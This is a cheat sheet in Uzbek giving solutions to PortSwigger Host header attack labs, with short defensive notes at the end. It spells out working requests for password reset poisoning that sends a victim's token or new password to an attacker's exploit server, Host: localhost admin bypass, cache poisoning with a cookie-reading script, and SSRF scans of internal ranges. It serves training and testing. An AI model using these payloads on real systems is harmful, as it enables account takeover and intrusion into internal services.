# HTTP Host Header Attacks — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**, Collaborator = **COLLAB.example.net**.
> Test: Repeater'da `Host:` ni o'zgartir — ilova reflect qiladimi / routing o'zgaradimi ko'r.

### Basic password reset poisoning — APPRENTICE
Reset link `Host` header'dan quriladi → carlos token'ini exploit serverga oldirasan.
```
POST /forgot-password
Host: exploit.example.net
username=carlos
→ exploit access log'da temp-forgot-password-token → haqiqiy link'ga qo'yib parol o'zgartir
```

### Host header authentication bypass — PRACTITIONER
`/admin` faqat local → `Host: localhost`.
```
GET /admin/delete?username=carlos
Host: localhost
```

### Web cache poisoning via ambiguous requests — PRACTITIONER
Ikkinchi (dublikat) `Host` header routing'ga ta'sir qilmaydi, lekin reflect bo'ladi → cache poison.
```
GET /?cb=123
Host: example.com
Host: exploit.example.net
```
> Exploit server `/resources/js/tracking.js` da `alert(document.cookie)`. `X-Cache: hit` gacha qayta jo'nat.

### Routing-based SSRF — PRACTITIONER
`Host` header back-end routing'ni belgilaydi → ichki `/admin` ga yo'naltirasan.
```
GET /
Host: 192.168.0.X        ← Intruder Numbers 0–255, "Update Host header" OFF → 302 topilgan IP
```
> Topilgach `GET /admin` o'sha Host bilan → `/admin/delete` CSRF token + session bilan POST.

### SSRF via flawed request parsing — PRACTITIONER
`Host` o'zgartirsang bloklanadi → request line'da absolute URL ishlatasan.
```
GET https://example.com/ HTTP/1.1
Host: 192.168.0.X        ← endi Host emas, absolute URL tekshiriladi
```
> Collaborator bilan tasdiq → `192.168.0.0/24` skan → `/admin/delete?csrf=...&username=carlos` POST.

### Host validation bypass via connection-state attack — PRACTITIONER
Birinchi so'rov validatsiyadan o'tadi, keyingi so'rovlar o'sha connection'da tekshirilmaydi.
Repeater'da 2 tab group, single connection, keep-alive.
```
Tab1: GET /   Host: example.com
Tab2: GET /admin   Host: 192.168.0.1
→ "Send group in sequence (single connection)" + Connection: keep-alive
```
> Keyin Tab2 = `POST /admin/delete` (`Host: 192.168.0.1`, cookie, `csrf=...&username=carlos`).

### Password reset poisoning via dangling markup — PRACTITIONER
`Host` domeni o'zgarsa error, lekin arbitrary **port** ishlaydi. Raw email sanitize qilinmaydi →
port'ga dangling markup inject qilib parolni exploit serverga chiqarasan.
```
POST /forgot-password
Host: example.com:'<a href="//exploit.example.net/?
username=carlos
→ raw email'da qolgan matn (yangi parol) URL'ga tushadi → exploit access log
```

---

### Eslatma
Test: `Host` o'zgartir / dublikat Host / absolute URL / port inject / `X-Forwarded-Host`.
Impact: password reset poisoning (ATO), routing SSRF (ichki admin), cache poison. Himoya:
Host'ni absolute URL qurishda ishlatma, strict validation, internal host'ni Host'dan olmaslik.
Umumiy: bu papka README.
